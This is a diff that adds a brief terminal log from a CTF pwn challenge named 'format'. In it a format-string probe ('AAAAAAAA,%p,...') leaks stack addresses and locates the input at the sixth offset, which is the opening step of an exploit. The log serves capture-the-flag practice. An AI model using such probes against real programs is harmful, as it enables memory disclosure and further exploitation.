@@ -1,0 +1,5 @@
+mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_format/format$ ./format 
+Enter your name
+AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p
+AAAAAAAA,0x7fffffffddb0,0x40,0x7ffff7af2031,0x10,0x7ffff7ff6540,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025
+�Thank you
